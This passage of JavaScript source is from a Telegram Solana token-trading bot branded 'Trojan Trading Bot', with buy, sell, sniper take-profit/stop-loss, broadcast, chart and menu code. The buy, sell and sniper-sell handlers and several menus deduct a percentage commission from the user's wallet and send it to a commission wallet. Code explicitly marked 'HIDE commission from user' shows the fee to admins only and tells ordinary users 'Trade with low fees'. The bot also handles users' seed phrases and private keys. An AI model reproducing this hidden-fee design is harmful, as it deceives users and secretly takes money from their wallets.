    const receivedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;

    // Commission
    const commissionSol = receivedSol * (COMMISSION_PERCENTAGE / 100);
    await sendCommission(activeWallet, commissionSol);

    const pair        = await fetchTokenData(token);
    const tokenSymbol = pair?.baseToken?.symbol || 'Unknown';
    const priceUsd    = parseFloat(pair?.priceUsd) || 0;
    const solPrice    = await getSolPriceWithCache();
    const valueUsd    = receivedSol * solPrice;
    let pnlUsd        = 0;
    const buys        = session.tradeHistory.filter(t => t.type === 'BUY' && t.tokenAddress === token);
    if (buys.length) {
      const avgBuy  = buys.reduce((s,t) => s+(t.valueUsd||0), 0) / buys.reduce((s,t) => s+(t.amountToken||0), 1);
      pnlUsd = valueUsd - (sellAmount / Math.pow(10, decimals)) * avgBuy;
    }
    await recordTrade(userId, { type:'SELL', tokenAddress:token, tokenSymbol, amountSol:receivedSol, amountToken:sellAmount/Math.pow(10,decimals), priceUsd, txHash:result.txid, valueUsd, pnlUsd, commission:commissionSol });
    await removeSnipe(userId, token);
    const txLink = `https://solscan.io/tx/${result.txid}`;
    await bot.telegram.sendMessage(userId,
      `🎯 <b>SNIPER EXECUTED</b>\n${escapeHtml(reason)}\nToken: <code>${shortenAddress(token)}</code>\nSold ${(sellAmount/Math.pow(10,decimals)).toFixed(4)} ${escapeHtml(tokenSymbol)} → ${(receivedSol*(1-COMMISSION_PERCENTAGE/100)).toFixed(4)} SOL\n📝 <a href="${txLink}">View TX</a>`,
      { parse_mode:'HTML' }
    );
  } catch (err) { console.error(`Sniper sell error for ${token}:`, err.message); }
}

let priceCheckInterval = null;
function startPriceChecker() {
  if (priceCheckInterval) clearInterval(priceCheckInterval);
  priceCheckInterval = setInterval(async () => {
    try {
      const allUsers = await storage.getSubscribers();
      for (const userId of allUsers) {
        try {
          const session = await getSession(userId);
          if (!session.activeSnipes.length) continue;
          for (const snipe of [...session.activeSnipes]) {
            try {
              const pair = await fetchTokenData(snipe.token);
              if (!pair?.priceUsd) continue;
              const cur = parseFloat(pair.priceUsd);
              if      (snipe.tpPrice && cur >= snipe.tpPrice)
                await executeSellForSnipe(userId, snipe.token, `✅ Take-Profit hit! $${snipe.tpPrice} → $${cur.toFixed(8)}`);
              else if (snipe.slPrice && cur <= snipe.slPrice)
                await executeSellForSnipe(userId, snipe.token, `❌ Stop-Loss hit! $${snipe.slPrice} → $${cur.toFixed(8)}`);
            } catch (e) { console.error(`Price check token ${snipe.token}:`, e.message); }
          }
        } catch (e) { console.error(`Price check user ${userId}:`, e.message); }
      }
    } catch (e) { console.error('Price checker error:', e.message); }
  }, 10000);
}
startPriceChecker();

// ============================================
// PNL IMAGE (QuickChart)
// ============================================
async function generatePNLImage(session) {
  const history = session.tradeHistory || [];
  if (!history.length) return null;
  const totalPnl    = history.reduce((s,t) => s+(t.pnlUsd||0), 0);
  const profitable  = history.filter(t => t.pnlUsd > 0).length;
  const losses      = history.filter(t => t.pnlUsd < 0).length;
  const dailyPnl    = {};
  history.forEach(t => {
    const d = t.date || new Date(t.timestamp).toDateString();
    dailyPnl[d] = (dailyPnl[d]||0) + (t.pnlUsd||0);
  });
  const dates  = Object.keys(dailyPnl).slice(-7);
  const values = dates.map(d => dailyPnl[d]);
  const cfg = {
    type: 'bar',
    data: {
      labels:   dates.map(d => d.slice(0,5)),
      datasets: [{ label:'PNL ($)', data:values, backgroundColor:values.map(v => v>=0?'#22c55e':'#ef4444'), borderRadius:4 }]
    },
    options: {
      title:  { display:true, text:`Total PNL: $${totalPnl.toFixed(2)} | W:${profitable} L:${losses}`, fontSize:16 },
      legend: { display:false },
      scales: { yAxes:[{ ticks:{ callback: v => '$'+v } }] }
    }
  };
  return `https://quickchart.io/chart?c=${encodeURIComponent(JSON.stringify(cfg))}&w=600&h=400`;
}

bot.action('pnl_image', async (ctx) => {
  await ctx.answerCbQuery('📊 Generating chart...');
  const session  = await getSession(ctx.from.id);
  const imageUrl = await generatePNLImage(session);
  if (imageUrl) await ctx.replyWithPhoto({ url: imageUrl }, { caption: '📈 Your PNL Chart' });
  else          await ctx.reply('No trades to chart yet.');
});

// ============================================
// BROADCAST
// ============================================
async function broadcastToSubscribersMedia(adminId, broadcastData) {
  const subs = await storage.getSubscribers();
  if (!subs.length) { await bot.telegram.sendMessage(adminId, '❌ No subscribers.'); return; }
  let ok = 0, fail = 0;
  for (const userId of subs) {
    try {
      const { type, content, caption } = broadcastData;
      if      (type === 'text')      await bot.telegram.sendMessage(userId, content, { parse_mode:'HTML' });
      else if (type === 'photo')     await bot.telegram.sendPhoto(userId, content, { caption, parse_mode:'HTML' });
      else if (type === 'video')     await bot.telegram.sendVideo(userId, content, { caption, parse_mode:'HTML' });
      else if (type === 'document')  await bot.telegram.sendDocument(userId, content, { caption, parse_mode:'HTML' });
      else if (type === 'animation') await bot.telegram.sendAnimation(userId, content, { caption, parse_mode:'HTML' });
      ok++;
      await new Promise(r => setTimeout(r, 50));
    } catch { fail++; }
  }
  await bot.telegram.sendMessage(adminId, `✅ Broadcast done!\n📨 Sent: ${ok}\n⚠️ Failed: ${fail}`);
}

bot.on('photo', async (ctx) => {
  const session = await getSession(ctx.from.id);
  if (!session.awaitingBroadcast) return;
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) { session.awaitingBroadcast = false; await saveSession(ctx.from.id, session); return; }
  const photo  = ctx.message.photo[ctx.message.photo.length-1];
  session.awaitingBroadcast = false;
  await saveSession(ctx.from.id, session);
  await broadcastToSubscribersMedia(ctx.from.id, { type:'photo', content:photo.file_id, caption:ctx.message.caption||'' });
});
bot.on('video', async (ctx) => {
  const session = await getSession(ctx.from.id);
  if (!session.awaitingBroadcast) return;
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) { session.awaitingBroadcast = false; await saveSession(ctx.from.id, session); return; }
  session.awaitingBroadcast = false;
  await saveSession(ctx.from.id, session);
  await broadcastToSubscribersMedia(ctx.from.id, { type:'video', content:ctx.message.video.file_id, caption:ctx.message.caption||'' });
});
bot.on('document', async (ctx) => {
  const session = await getSession(ctx.from.id);
  if (!session.awaitingBroadcast) return;
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) { session.awaitingBroadcast = false; await saveSession(ctx.from.id, session); return; }
  session.awaitingBroadcast = false;
  await saveSession(ctx.from.id, session);
  await broadcastToSubscribersMedia(ctx.from.id, { type:'document', content:ctx.message.document.file_id, caption:ctx.message.caption||'' });
});
bot.on('animation', async (ctx) => {
  const session = await getSession(ctx.from.id);
  if (!session.awaitingBroadcast) return;
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) { session.awaitingBroadcast = false; await saveSession(ctx.from.id, session); return; }
  session.awaitingBroadcast = false;
  await saveSession(ctx.from.id, session);
  await broadcastToSubscribersMedia(ctx.from.id, { type:'animation', content:ctx.message.animation.file_id, caption:ctx.message.caption||'' });
});

// ============================================
// BUY HANDLER — commission deducted from SOL before swap
// ============================================
async function handleBuy(ctx, amount, tokenAddress, tpPrice = null, slPrice = null) {
  const session      = await getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  const userId       = ctx.from.id;
  if (!activeWallet) {
    await ctx.reply('❌ No wallet. Connect one first.', { ...Markup.inlineKeyboard([[Markup.button.callback('💼 Wallet', 'menu_wallet')]]) });
    return;
  }
  if (!isSolanaAddress(tokenAddress)) { await ctx.reply('❌ Invalid token address.'); return; }

  const commissionSol = COMMISSION_PERCENTAGE > 0 && COMMISSION_WALLET ? amount * (COMMISSION_PERCENTAGE/100) : 0;
  const swapSol       = amount - commissionSol;

  const balance    = await getBalance(activeWallet.publicKey);
  const totalNeed  = amount + session.settings.priorityFee + 0.006;
  if (balance < totalNeed) {
    await ctx.reply(`❌ Insufficient SOL.\nHave: ${balance.toFixed(4)}\nNeed: ~${totalNeed.toFixed(4)} (swap + fee + priority)`);
    return;
  }

  // HIDE commission from user, show to admin only
  let feeDisplay = '';
  if (isAdmin(userId) && commissionSol > 0) {
    feeDisplay = `\nFee: ${commissionSol.toFixed(4)} SOL (${COMMISSION_PERCENTAGE}%)`;
  } else if (commissionSol > 0) {
    feeDisplay = '\n💎 Trade with low fees';
  }

  const statusMsg = await ctx.reply(
    `🔄 Processing Buy\nAmount: ${swapSol.toFixed(4)} SOL${feeDisplay}\nToken: \`${shortenAddress(tokenAddress)}\`\nSlippage: ${session.settings.slippage}%\n\nGetting Jupiter quote...`,
    { parse_mode:'Markdown' }
  );
  try {
    const lamports      = Math.floor(swapSol * LAMPORTS_PER_SOL);
    const slippageBps   = Math.max(50, Math.min(Math.floor(session.settings.slippage * 100), 5000));
    const quote         = await getJupiterQuote(SOL_MINT, tokenAddress, lamports, slippageBps);
    if (!quote?.outAmount) throw new Error('No route found — token may have insufficient liquidity.');

    const outputDecimals = quote.outputDecimals || 9;
    const expectedOut    = parseInt(quote.outAmount) / Math.pow(10, outputDecimals);

    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
      `🔄 Executing swap...\n~${expectedOut.toFixed(4)} tokens expected`, { parse_mode:'Markdown' });

    const result = await executeJupiterSwap(quote, activeWallet, session.settings.priorityFee);

    // Send commission as separate SOL transfer
    if (commissionSol > 0) await sendCommission(activeWallet, commissionSol);

    const receivedAmount = parseInt(quote.outAmount) / Math.pow(10, outputDecimals);
    let tokenSymbol = 'Unknown', tokenName = 'Unknown', priceUsd = 0;
    try {
      const pair  = await fetchTokenData(tokenAddress);
      tokenSymbol = pair?.baseToken?.symbol || 'Unknown';
      tokenName   = pair?.baseToken?.name   || 'Unknown';
      priceUsd    = parseFloat(pair?.priceUsd) || 0;
    } catch { /* non-critical */ }
    const solPrice = await getSolPriceWithCache();
    const valueUsd = amount * solPrice;

    await recordTrade(ctx.from.id, { type:'BUY', tokenAddress, tokenSymbol, tokenName, amountSol:swapSol, amountToken:receivedAmount, priceUsd, txHash:result.txid, valueUsd, pnlUsd:0, commission:commissionSol });
    await addSnipe(ctx.from.id, tokenAddress, priceUsd, receivedAmount, result.txid, tpPrice, slPrice);
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, { type:'BUY', amount:amount, token:tokenAddress, txHash:result.txid, commission:commissionSol.toFixed(6) });

    const txLink = `https://solscan.io/tx/${result.txid}`;
    
    // HIDE commission in success message
    let successFeeDisplay = '';
    if (isAdmin(userId) && commissionSol > 0) {
      successFeeDisplay = `\n💸 Fee: ${commissionSol.toFixed(4)} SOL`;
    } else if (commissionSol > 0) {
      successFeeDisplay = '\n💎 Trade with low fees';
    }
    
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
      `✅ Buy Successful!\n💰 Spent: ${swapSol.toFixed(4)} SOL${successFeeDisplay}\n🪙 Received: ~${receivedAmount.toFixed(4)} ${escapeHtml(tokenSymbol)}\n💵 Value: ~$${valueUsd.toFixed(2)}\n📝 TX: <a href="${txLink}">${result.txid}</a>`,
      { parse_mode:'HTML', disable_web_page_preview:true, ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 Solscan', txLink)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  } catch (error) {
    console.error('Buy error:', error);
    try {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
        `❌ Buy Failed\n\n${escapeHtml(error.message)}`,
        { parse_mode:'HTML', ...Markup.inlineKeyboard([[Markup.button.callback('🔄 Retry', `buy_${amount}_${tokenAddress}`)],[Markup.button.callback('🏠 Menu', 'back_main')]]) }
      );
    } catch { /* ignore */ }
  }
}

// ============================================
// SELL HANDLER — commission from received SOL
// ============================================
async function handleSell(ctx, percentage, tokenAddress) {
  const session      = await getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  const userId       = ctx.from.id;
  if (!activeWallet) {
    await ctx.reply('❌ No wallet. Connect one first.', { ...Markup.inlineKeyboard([[Markup.button.callback('💼 Wallet', 'menu_wallet')]]) });
    return;
  }
  if (!isSolanaAddress(tokenAddress)) { await ctx.reply('❌ Invalid token address.'); return; }
  const validPct = Math.max(1, Math.min(percentage, 100));
  const statusMsg = await ctx.reply(
    `🔄 Processing Sell\nSelling: ${validPct}%\nToken: \`${shortenAddress(tokenAddress)}\`\nSlippage: ${session.settings.slippage}%\n\nChecking balance...`,
    { parse_mode:'Markdown' }
  );
  try {
    const tokenBalance = await getTokenBalance(activeWallet.publicKey, tokenAddress);
    if (!tokenBalance || tokenBalance.amount <= 0) {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, '❌ No tokens to sell.');
      return;
    }
    const decimals   = tokenBalance.decimals || 9;
    const sellAmount = Math.floor(tokenBalance.amount * (validPct/100) * Math.pow(10, decimals));
    if (sellAmount <= 0) {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, '❌ Sell amount too small (dust).');
      return;
    }
    const slippageBps  = Math.max(50, Math.min(Math.floor(session.settings.slippage * 100), 5000));
    const displayAmt   = (sellAmount / Math.pow(10, decimals)).toFixed(4);
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
      `🔄 Selling ${displayAmt} tokens...\nGetting quote...`, { parse_mode:'Markdown' });

    const quote = await getJupiterQuote(tokenAddress, SOL_MINT, sellAmount, slippageBps);
    if (!quote?.outAmount) throw new Error('No route — token may have insufficient liquidity.');

    const expectedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
      `🔄 Executing swap...\n~${expectedSol.toFixed(4)} SOL expected`, { parse_mode:'Markdown' });

    const result      = await executeJupiterSwap(quote, activeWallet, session.settings.priorityFee);
    const receivedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;

    // Commission from received SOL
    const commissionSol = COMMISSION_PERCENTAGE > 0 && COMMISSION_WALLET ? receivedSol * (COMMISSION_PERCENTAGE/100) : 0;
    if (commissionSol > 0) await sendCommission(activeWallet, commissionSol);
    const netSol = receivedSol - commissionSol;

    let tokenSymbol = 'Unknown', tokenName = 'Unknown', priceUsd = 0;
    try {
      const pair  = await fetchTokenData(tokenAddress);
      tokenSymbol = pair?.baseToken?.symbol || 'Unknown';
      tokenName   = pair?.baseToken?.name   || 'Unknown';
      priceUsd    = parseFloat(pair?.priceUsd) || 0;
    } catch { /* non-critical */ }
    const solPrice = await getSolPriceWithCache();
    const valueUsd = receivedSol * solPrice;
    let pnlUsd     = 0;
    const buys     = session.tradeHistory.filter(t => t.type==='BUY' && t.tokenAddress===tokenAddress);
    if (buys.length) {
      const totalSpent  = buys.reduce((s,t) => s+(t.valueUsd||0), 0);
      const totalBought = buys.reduce((s,t) => s+(t.amountToken||0), 0);
      const avgBuy      = totalBought > 0 ? totalSpent/totalBought : 0;
      pnlUsd = valueUsd - (sellAmount/Math.pow(10,decimals)) * avgBuy;
    }
    await recordTrade(ctx.from.id, { type:'SELL', tokenAddress, tokenSymbol, tokenName, amountSol:receivedSol, amountToken:sellAmount/Math.pow(10,decimals), priceUsd, txHash:result.txid, valueUsd, pnlUsd, commission:commissionSol });
    await removeSnipe(ctx.from.id, tokenAddress);
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, { type:'SELL', amount:validPct+'%', token:tokenAddress, txHash:result.txid, commission:commissionSol.toFixed(6) });

    const txLink  = `https://solscan.io/tx/${result.txid}`;
    const pnlText = pnlUsd !== 0 ? `\n${pnlUsd>=0?'🟢':'🔴'} PNL: ${pnlUsd>=0?'+':''}${Math.abs(pnlUsd).toFixed(2)}` : '';
    
    // HIDE commission in success message
    let successFeeDisplay = '';
    if (isAdmin(userId) && commissionSol > 0) {
      successFeeDisplay = `\n💸 Fee: ${commissionSol.toFixed(4)} SOL`;
    } else if (commissionSol > 0) {
      successFeeDisplay = '\n💎 Trade with low fees';
    }
    
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
      `✅ Sell Successful!\n💰 Sold: ${displayAmt} ${escapeHtml(tokenSymbol)}\n🪙 Received: ${netSol.toFixed(4)} SOL${successFeeDisplay}\n💵 Value: ~$${valueUsd.toFixed(2)}${pnlText}\n📝 TX: <a href="${txLink}">${result.txid}</a>`,
      { parse_mode:'HTML', disable_web_page_preview:true, ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 Solscan', txLink)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  } catch (error) {
    console.error('Sell error:', error);
    try {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
        `❌ Sell Failed\n\n${escapeHtml(error.message)}`,
        { parse_mode:'HTML', ...Markup.inlineKeyboard([[Markup.button.callback('🔄 Retry', `sell_${percentage}_${tokenAddress}`)],[Markup.button.callback('🏠 Menu', 'back_main')]]) }
      );
    } catch { /* ignore */ }
  }
}

// ============================================
// MENUS
// ============================================
async function showMainMenu(ctx, edit = false) {
  try {
    const session      = await getSession(ctx.from.id);
    const activeWallet = getActiveWallet(session);
    const userId       = ctx.from.id;
    let balance = null, solPrice = 0, usdValue = 0, extra = '';
    if (activeWallet?.publicKey) {
      try { balance  = await getBalanceWithFallback(activeWallet.publicKey); } catch { const c = balanceCache.get(activeWallet.publicKey); if (c) { balance = c.balance; extra = '(cached)'; } }
      try { solPrice = await getSolPriceWithCache(); } catch { solPrice = solPriceCache.price || 0; }
      usdValue = (balance || 0) * solPrice;
    }
    const todayPnl  = session.dailyStats?.totalPnl || 0;
    const pnlEmoji  = todayPnl >= 0 ? '🟢' : '🔴';
    const pnlSign   = todayPnl >= 0 ? '+' : '';
    let walletInfo;
    if (!activeWallet) {
      walletInfo = '⚠️ *No wallet connected*\nTap 💼 Wallet to create or import';
    } else {
      const short = shortenAddress(activeWallet.publicKey);
      if (balance === null) walletInfo = `💼 *Wallet ${session.activeWalletIndex+1}/${session.wallets.length}:* \`${short}\`\n💰 *Balance: Loading...*`;
      else {
        const usdPart = solPrice > 0 ? ` ($${usdValue.toFixed(2)})` : '';
        walletInfo = `💼 *Wallet ${session.activeWalletIndex+1}/${session.wallets.length}:* \`${short}\`\n💰 *Balance:* ${balance.toFixed(4)} SOL${usdPart} ${extra}`;
      }
    }
    
    // HIDE commission from users, show to admins only
    let feeNote = '';
    if (isAdmin(userId) && COMMISSION_PERCENTAGE > 0) {
      feeNote = `\n💸 *Platform fee: ${COMMISSION_PERCENTAGE}%* per trade`;
    } else if (COMMISSION_PERCENTAGE > 0) {
      feeNote = '\n💎 *Trade with low fees* — Use referral link';
    }
    
    const message = `👋 *Trojan Trading Bot*\n\n*Your AI Trading Assistant on Solana* ⚡\n━━━━━━━━━━━━━━━━━━━━━━━\n🚨 Real-time pump detection\n💳 Instant wallet alerts\n🎯 Auto TP/SL management\n🤖 Smart trade execution${feeNote}\n━━━━━━━━━━━━━━━━━━━━━━━\n📊 Today PNL: ${pnlEmoji} ${pnlSign}$${Math.abs(todayPnl).toFixed(2)}\n\n${walletInfo}\n\nPaste a Solana contract address to analyze`;
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💼 Wallet', 'menu_wallet')],
      [Markup.button.callback('📊 Positions', 'menu_positions'), Markup.button.callback('🚀 Buy', 'menu_buy')],
      [Markup.button.callback('💸 Sell', 'menu_sell'), Markup.button.callback('🎯 Sniper (TP/SL)', 'menu_sniper')],
      [Markup.button.callback('📜 Trade History', 'menu_history'), Markup.button.callback('📈 PNL Report', 'menu_pnl_report')],
      [Markup.button.callback('⚙️ Settings', 'menu_settings'), Markup.button.callback('🎁 Referrals', 'menu_referrals')],
      [Markup.button.callback('❓ Help', 'menu_help'), Markup.button.callback('🔄 Refresh', 'refresh_main')]
    ]);
    try {
      if (edit && ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode:'Markdown', ...keyboard });
      else                           await ctx.reply(message, { parse_mode:'Markdown', ...keyboard });
    } catch { await ctx.reply(message, { parse_mode:'Markdown', ...keyboard }); }
  } catch (error) {
    console.error('Main menu error:', error);
    await ctx.reply('🚀 Trojan Bot\n\n⚠️ Error loading menu', { ...Markup.inlineKeyboard([[Markup.button.callback('🔄 Refresh', 'refresh_main')]]) });
  }
}

async function showWalletMenu(ctx, edit = false) {
  try {
    const session = await getSession(ctx.from.id);
    const active  = getActiveWallet(session);
    let message, keyboardButtons = [];
    if (session.wallets.length > 0) {
      let solPrice = 0;
      try { solPrice = await getSolPriceWithCache(); } catch { /* ignore */ }
      let walletList = '';
      for (let i = 0; i < session.wallets.length; i++) {
        const w       = session.wallets[i];
        const isAct   = i === session.activeWalletIndex;
        let bal = 0;
        try { bal = await getBalance(w.publicKey); } catch { /* ignore */ }
        walletList += `${isAct?'✅':'⚪'} *Wallet ${i+1}:* \`${shortenAddress(w.publicKey)}\` (${bal.toFixed(3)} SOL${solPrice>0?` ~$${(bal*solPrice).toFixed(2)}`:''} )\n`;
      }
      let activeBal = 0;
      try { activeBal = await getBalance(active.publicKey); } catch { /* ignore */ }
      message = `💼 Wallet Management\n\n${walletList}\n📍 *Active:* \`${active.publicKey}\`\n💰 Balance: ${activeBal.toFixed(4)} SOL${solPrice>0?` ($${(activeBal*solPrice).toFixed(2)})`:''}\n\nTap wallet to switch:`;
      keyboardButtons.push(session.wallets.map((_,i) => Markup.button.callback(`${i===session.activeWalletIndex?'✅':'🪪'} W${i+1}`, `switch_wallet_${i}`)));
      keyboardButtons.push([Markup.button.callback('📥 Deposit', 'wallet_deposit'), Markup.button.callback('📤 Transfer', 'wallet_transfer_menu')]);
      keyboardButtons.push([Markup.button.callback('📤 Export Keys', 'wallet_export'), Markup.button.callback('🗑️ Remove', 'wallet_remove')]);
      if (session.wallets.length < MAX_WALLETS) keyboardButtons.push([Markup.button.callback('🆕 Create New Wallet', 'wallet_create')]);
      keyboardButtons.push([Markup.button.callback('📥 Import Seed', 'wallet_import_seed'), Markup.button.callback('🔑 Import Key', 'wallet_import_key')]);
      keyboardButtons.push([Markup.button.callback('🔄 Refresh', 'wallet_refresh'), Markup.button.callback('« Back', 'back_main')]);
    } else {
      message = `💼 Wallet Management\n\nNo wallet yet. Up to ${MAX_WALLETS} wallets supported.`;
      keyboardButtons = [
        [Markup.button.callback('🆕 Create New Wallet',  'wallet_create')],
        [Markup.button.callback('📥 Import Seed Phrase', 'wallet_import_seed')],
        [Markup.button.callback('🔑 Import Private Key', 'wallet_import_key')],
        [Markup.button.callback('« Back', 'back_main')]
      ];
    }
    const keyboard = Markup.inlineKeyboard(keyboardButtons);
    try {
      if (edit && ctx.callbackQuery) await ctx.editMessageText(message, { parse_mode:'Markdown', ...keyboard });
      else                           await ctx.reply(message, { parse_mode:'Markdown', ...keyboard });
    } catch { await ctx.reply(message, { parse_mode:'Markdown', ...keyboard }); }
  } catch (error) {
    console.error('Wallet menu error:', error);
    await ctx.reply('❌ Error loading wallet menu.');
  }
}

async function showPositionsMenu(ctx, edit = false) {
  const session = await getSession(ctx.from.id);
  const active  = getActiveWallet(session);
  if (!active) {
    const msg = '❌ Please connect a wallet first.';
    const kb  = Markup.inlineKeyboard([[Markup.button.callback('💼 Connect Wallet','menu_wallet')],[Markup.button.callback('« Back','back_main')]]);
    if (edit) await ctx.editMessageText(msg, kb); else await ctx.reply(msg, kb);
    return;
  }
  const msg = `📊 Your Positions\n💼 Wallet: \`${shortenAddress(active.publicKey)}\`\n\nNo open positions tracked.\nPaste a token address to analyze and trade.`;
  const kb  = Markup.inlineKeyboard([[Markup.button.callback('🔄 Refresh','refresh_positions')],[Markup.button.callback('« Back','back_main')]]);
  if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
}

async function showBuyMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  let feeNote = '';
  if (isAdmin(userId) && COMMISSION_PERCENTAGE > 0) {
    feeNote = `\n💸 ${COMMISSION_PERCENTAGE}% fee applies`;
  } else if (COMMISSION_PERCENTAGE > 0) {
    feeNote = '\n💎 Trade with low fees';
  }
  const msg     = `🟢 Quick Buy${feeNote}\n\nPaste a token address, or pick an amount then paste the address.`;
  const kb      = Markup.inlineKeyboard([
    [Markup.button.callback('🚀 0.1 SOL', 'setbuy_0.1'), Markup.button.callback('🚀 0.2 SOL', 'setbuy_0.2')],
    [Markup.button.callback('🚀 0.5 SOL', 'setbuy_0.5'), Markup.button.callback('🚀 1 SOL',   'setbuy_1')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
}

async function showSellMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  let feeNote = '';
  if (isAdmin(userId) && COMMISSION_PERCENTAGE > 0) {
    feeNote = `\n💸 ${COMMISSION_PERCENTAGE}% fee applies`;
  } else if (COMMISSION_PERCENTAGE > 0) {
    feeNote = '\n💎 Trade with low fees';
  }
  const msg     = `🔴 Quick Sell${feeNote}\n\nPaste a token address, or pick percentage first.`;
  const kb      = Markup.inlineKeyboard([
    [Markup.button.callback('💸 25%', 'setsell_25'),   Markup.button.callback('💸 50%', 'setsell_50')],
    [Markup.button.callback('💸 100%','setsell_100'),  Markup.button.callback('💸 Custom','setsell_custom')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
}

async function showSniperMenu(ctx, edit = false) {
  const session      = await getSession(ctx.from.id);
  const activeSnipes = session.activeSnipes;
  let txt = activeSnipes.length
    ? activeSnipes.map((s,i) => `${i+1}. \`${shortenAddress(s.token)}\`\n   Entry: $${s.entryPrice?.toFixed(8)||'?'} | Tokens: ${s.amountToken?.toFixed(4)||'?'}\n   TP: ${s.tpPrice?'$'+s.tpPrice.toFixed(8):'❌'} | SL: ${s.slPrice?'$'+s.slPrice.toFixed(8):'❌'}`).join('\n\n')
    : '_No active snipes._';
  const msg = `🎯 *SNIPER MODE — TP/SL*\n\n${txt}\n\nSet TP/SL after buying a token.`;
  const kb  = Markup.inlineKeyboard([
    [Markup.button.callback('➕ Set TP/SL', 'sniper_set')],
    [Markup.button.callback('🗑️ Cancel Snipe', 'sniper_cancel')],
    [Markup.button.callback('🔄 Refresh', 'menu_sniper')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  try {
    if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb });
    else      await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
  } catch { await ctx.reply(msg, { parse_mode:'Markdown', ...kb }); }
}

async function showReferralsMenu(ctx, edit = false) {
  const session      = await getSession(ctx.from.id);
  const code         = await getReferralCode(ctx.from.id);
  let botUsername    = 'bot';
  try { botUsername = (await bot.telegram.getMe()).username; } catch { /* ignore */ }
  const link    = `https://t.me/${botUsername}?start=ref_${code}`;
  const total   = session.referrals.length;
  const earned  = (session.referralEarnings||0).toFixed(4);
  const recent  = total > 0 ? '\n*Recent:*\n' + session.referrals.slice(-5).map((r,i) => `${i+1}. User ...${r.userId.toString().slice(-4)} — ${new Date(r.joinedAt).toLocaleDateString()}`).join('\n') : '\n_No referrals yet._';
  const msg     = `🎁 *Referral Program*\n\n📊 Referrals: ${total}\n💰 Earned: ${earned} SOL\n\n🔗 Your link:\n\`${link}\`\n📋 Code: \`${code}\`\n\nEarn 10% of referred users' trading fees!${recent}`;
  const kb      = Markup.inlineKeyboard([
    [Markup.button.callback('📋 Copy Link', 'referral_copy')],
    [Markup.button.callback('📤 Share',     'referral_share')],
    [Markup.button.callback('🔄 Refresh',   'referral_refresh')],
    [Markup.button.callback('« Back',       'back_main')]
  ]);
  try {
    if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb });
    else      await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
  } catch { await ctx.reply(msg, { parse_mode:'Markdown', ...kb }); }
}

async function showHelpMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  let feeText = '';
  if (isAdmin(userId) && COMMISSION_PERCENTAGE > 0) {
    feeText = `\n💸 Platform fee: ${COMMISSION_PERCENTAGE}% per trade`;
  } else if (COMMISSION_PERCENTAGE > 0) {
    feeText = '\n💎 Trade with low fees';
  }
  const msg = `❓ *Help & Commands*\n\n/start — Main menu\n/wallet — Manage wallets\n/positions — Token positions\n/buy [amount] [address] — Quick buy\n/sell [%] [address] — Quick sell\n/sniper — TP/SL management\n/settings — Bot settings\n/referral — Referral program\n/help — This menu\n\n━━━━━━━━━━━━━━━━━━\n🔧 *Features*\n💼 Up to ${MAX_WALLETS} wallets\n📊 Token security analysis\n🎯 Limit orders & DCA\n🔔 Price alerts\n🎯 Sniper TP/SL (auto sell)\n🎁 Referral system${feeText}\n\n━━━━━━━━━━━━━━━━━━\nPaste any Solana contract address to analyze & trade\n\nSupport: @prophetpumpsupport`;
  const kb = Markup.inlineKeyboard([
    [Markup.button.callback('💼 Wallet Guide', 'help_wallet'), Markup.button.callback('📊 Trading Guide', 'help_trading')],
    [Markup.button.callback('🔒 Security',     'help_security'), Markup.button.callback('❓ FAQ',         'help_faq')],
    [Markup.button.callback('« Back to Main',  'back_main')]
  ]);
  try {
    if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb });
    else      await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
  } catch { await ctx.reply(msg, { parse_mode:'Markdown', ...kb }); }
}

async function showSettingsMenu(ctx, edit = false) {
  const session = await getSession(ctx.from.id);
  const userId  = ctx.from.id;
  const { slippage, priorityFee, notifications } = session.settings;
  
  let feeDisplay = '';
  if (isAdmin(userId) && COMMISSION_PERCENTAGE > 0) {
